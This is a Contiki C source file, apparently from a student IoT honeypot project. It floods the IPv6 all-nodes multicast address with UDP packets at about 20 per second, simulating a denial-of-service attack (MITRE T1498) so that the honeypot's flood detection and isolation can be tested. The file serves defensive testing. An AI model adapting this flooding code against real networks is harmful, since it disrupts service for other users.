/*
 * attacker-flood.c
 *
 * Attack Scenario 1 - UDP Flood / Denial of Service
 * Sends high-rate PING-prefixed UDP packets to all nodes
 * Triggers Model 2 flood detection in honeypot
 * when pkt_count exceeds FLOOD_THRESHOLD within window
 *
 * MITRE T1498 - Network Denial of Service
 *
 * Now shows Tx and Rx counters consistent with
 * all other attacker files
 *
 * NOTE ON Rx COUNT:
 * Attacker sends to ff02::1 (all-nodes multicast)
 * Each real node (ID 2,3,4) responds separately
 * So Rx grows at 3x rate of Tx before block
 * After block Rx freezes = proof of isolation
 *
 * Author: Anam Sabah Khan - G202402840
 */

#include "contiki.h"
#include "net/ipv6/simple-udp.h"
#include "net/ipv6/uip.h"
#include "sys/log.h"
#include "random.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

#define LOG_MODULE "ATTACKER"
#define LOG_LEVEL  LOG_LEVEL_INFO

#define UDP_CLIENT_PORT   8765
#define UDP_SERVER_PORT   5678

/*
 * CLOCK_SECOND/20 = 0.05 seconds = 20 packets per second
 * FLOOD_THRESHOLD = 15 packets in 5 seconds
 * Detection triggers within first second
 */
#define SEND_INTERVAL  (CLOCK_SECOND / 20)
#define JITTER_MAX     (CLOCK_SECOND / 50)

static struct simple_udp_connection udp_conn;
static uip_ipaddr_t                dest_ipaddr;

static uint32_t tx_count = 0;
static uint32_t rx_count = 0;

/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
                const uip_ipaddr_t *sender_addr,
                uint16_t sender_port,
                const uip_ipaddr_t *receiver_addr,
                uint16_t receiver_port,
                const uint8_t *data,
                uint16_t datalen)
{
  rx_count++;
  LOG_INFO("RECEIVED '%.*s' from ",
           datalen, (const char *)data);
  LOG_INFO_6ADDR(sender_addr);
  LOG_INFO_(" (Tx=%" PRIu32 " Rx=%" PRIu32 ")\n",
            tx_count, rx_count);
}

/*---------------------------------------------------------------------------*/
PROCESS(attacker_flood_process, "Attacker FLOOD (multicast)");
AUTOSTART_PROCESSES(&attacker_flood_process);

PROCESS_THREAD(attacker_flood_process, ev, data)
{
  static struct etimer periodic_timer;
  static char          msg[64];

  PROCESS_BEGIN();

  LOG_INFO("Attacker (UDP Flood / DoS) started\n");
  LOG_INFO("Target: ff02::1 (all-nodes multicast)\n");
  LOG_INFO("Rate: 20 packets/sec\n");
  LOG_INFO("Detection threshold: 15 pkts in 5 sec\n");

  simple_udp_register(&udp_conn,
                      UDP_CLIENT_PORT,
                      NULL,
                      UDP_SERVER_PORT,
                      udp_rx_callback);

  uip_create_linklocal_allnodes_mcast(&dest_ipaddr);

  etimer_set(&periodic_timer, SEND_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer));

    snprintf(msg, sizeof(msg), "PING %" PRIu32, tx_count);

    LOG_INFO("Sending '%s' to ff02::1 "
             "(Tx=%" PRIu32 " Rx=%" PRIu32 ")\n",
             msg, tx_count, rx_count);

    simple_udp_sendto(&udp_conn, msg, strlen(msg),
                      &dest_ipaddr);
    tx_count++;

    etimer_set(&periodic_timer,
               SEND_INTERVAL
               + (CLOCK_SECOND / 100)
               * (random_rand() % (JITTER_MAX + 1)));
  }

  PROCESS_END();
}
